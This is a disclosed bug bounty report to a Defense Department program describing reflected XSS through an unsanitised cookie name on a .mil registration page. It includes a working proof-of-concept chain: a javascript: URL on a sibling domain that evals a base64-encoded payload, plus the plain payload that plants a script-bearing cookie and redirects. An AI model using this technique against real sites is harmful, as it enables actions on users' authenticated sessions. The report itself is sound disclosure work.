# [HTAF4-213] [Pre-submission] XSS via arbitrary cookie name at the https://www2.██████/nssi/core/dot_stu_reg/Registration.aspx

## Report Details
- **Report ID**: 728001
- **URL**: https://hackerone.com/reports/728001
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-11-02T20:23:42.929Z
- **Disclosed**: 2024-06-18T16:56:14.418Z

## Reporter
- **Username**: sp1d3rs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Description
We identified XSS via cookie name on the `https://www2.███████/nssi/core/dot_stu_reg/Registration.aspx` endpoint.
The first cookie name is getting reflected on the page without sanitization:
█████

##POC (you can use Chrome Incognito mode for clear experiment)
To trigger XSS on the https://www2.██████████/nssi/core/dot_stu_reg/Registration.aspx we used XSS on the different .████.mil property, to set the cookie to the `.███.mil` which can be visible from the `www2.████`, and then do redirect to the vulnerable endpoint:
```
https://███████.███████.mil/kc/main/pop_up_frm.asp?loc=javascript:top[%27ev%27+%27al%27](atob(%27ZG9jdW1lbnQuY29va2llPSd6eno8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD49enp6O3BhdGg9Lztkb21haW49LmFmLm1pbCc7IHdpbmRvdy50b3AubG9jYXRpb24uaHJlZiA9ICdodHRwczovL3d3dzIucGV0ZXJzb24uYWYubWlsL25zc2kvY29yZS9kb3Rfc3R1X3JlZy9SZWdpc3RyYXRpb24uYXNweCc7%27))
```
The plain payload:
```
document.cookie='zzz<script>alert(document.domain)</script>=zzz;path=/;domain=.████.mil'; window.top.location.href = 'https://www2.███████/nssi/core/dot_stu_reg/Registration.aspx';
```
The result:
██████████
Video:
████████

##Suggested fix
We feel there is no need to reflect cookies, generic error message should be more than enough.

## Impact

Reflected XSS. The `https://www2.█████████/nssi/` has authenticated experience, such as login/registration/manage endpoints for courses users, and it can be used for interactions on their behalf.

## Attachments
No attachments
